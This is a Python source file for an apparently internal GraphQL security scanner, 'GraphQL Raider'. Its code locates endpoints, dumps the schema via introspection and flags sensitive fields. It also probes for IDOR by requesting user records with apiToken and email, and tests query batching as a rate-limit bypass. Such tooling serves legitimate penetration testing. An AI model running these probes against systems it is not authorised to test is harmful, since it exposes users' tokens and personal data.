#!/usr/bin/env python3
"""graphql_raider.py — GraphQL attack suite (INTERNAL).

Finds the endpoint, dumps schema via introspection, hunts IDOR through object
queries, and checks query batching (which silently defeats rate limits).

    python TOOLS/graphql_raider.py --url http://127.0.0.1:9200/
    python TOOLS/graphql_raider.py --url http://host --endpoint /api/graphql
"""
import argparse
import json
import os
import re
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

CANDIDATE_PATHS = ["/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
                   "/query", "/api/query", "/gql", "/api/gql"]
SENSITIVE = ("token", "apitoken", "secret", "password", "passwd", "ssn",
             "creditcard", "email", "phone", "privatekey", "session")
INTROSPECTION = '{"query":"{__schema{types{name fields{name}}}}" }'


class GraphQLRaider(VibeTool):
    def __init__(self, base):
        super().__init__("GraphQL Raider", "GraphQL Attack Suite")
        self.base = base.rstrip("/")
        self.findings = 0

    def _post(self, path, raw):
        try:
            req = urllib.request.Request(
                self.base + path, data=raw.encode(), method="POST",
                headers={"User-Agent": privacy_user_agent("GraphQL Raider"),
                         "Content-Type": "application/json", "Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=8) as r:
                return r.getcode(), r.read(60000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(60000).decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    def _find(self, override):
        for path in ([override] if override else CANDIDATE_PATHS):
            st, body = self._post(path, INTROSPECTION)
            if st and ("__schema" in body or '"data"' in body or "errors" in body):
                return path, body
        return "", ""

    def run(self, endpoint):
        self.banner()
        self.log(f"Locating GraphQL endpoint on {self.base} ...")
        path, intro = self._find(endpoint)
        if not path:
            self.log("No GraphQL endpoint found. Pass --endpoint if non-standard.", "warn")
            return 0
        self.log(f"GraphQL endpoint: {path}")
        if "__schema" in intro:
            fields = re.findall(r'"name"\s*:\s*"([^"]+)"', intro)
            sensitive = sorted({f for f in fields if f.lower() in SENSITIVE})
            self.log("INTROSPECTION ENABLED — full schema readable by anyone", "hack")
            self.findings += 1
            if sensitive:
                self.log(f"  sensitive fields in schema: {', '.join(sensitive)}", "crit")
        else:
            self.log("Introspection appears disabled (good).", "pass")
        leaked = []
        for oid in range(1, 6):
            st, body = self._post(path, json.dumps(
                {"query": f"{{ user(id:{oid}) {{ id name email apiToken }} }}"})
            )
            if st == 200 and '"apiToken"' in body and "null" not in body.split('"user"')[-1][:20]:
                leaked.append(oid)
        if len(leaked) >= 2:
            self.log(f"BROKEN OBJECT-LEVEL AUTH (IDOR) — {len(leaked)} user objects "
                     "inc. apiToken readable with no auth", "hack")
            self.findings += 1
        batch = "[" + ",".join('{"query":"{ user(id:%d){id} }"}' % i for i in range(1, 6)) + "]"
        st, body = self._post(path, batch)
        if st == 200 and body.strip().startswith("[") and body.count('"data"') >= 3:
            self.log("QUERY BATCHING ENABLED — defeats rate limits, amplifies IDOR/brute-force", "hack")
            self.findings += 1
        self.log("=" * 40)
        if self.findings:
            self.log(f"GRAPHQL RAID COMPLETE — {self.findings} finding(s)", "hack")
        else:
            self.log("GraphQL surface looks locked down.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="GraphQL Raider - GraphQL attack suite")
    p.add_argument("--url", required=True)
    p.add_argument("--endpoint", default="")
    p.add_argument("-v", "--version", action="version", version="GraphQL Raider 1.0.0")
    args = p.parse_args(argv)
    return GraphQLRaider(args.url).run(args.endpoint)


if __name__ == "__main__":
    sys.exit(main())
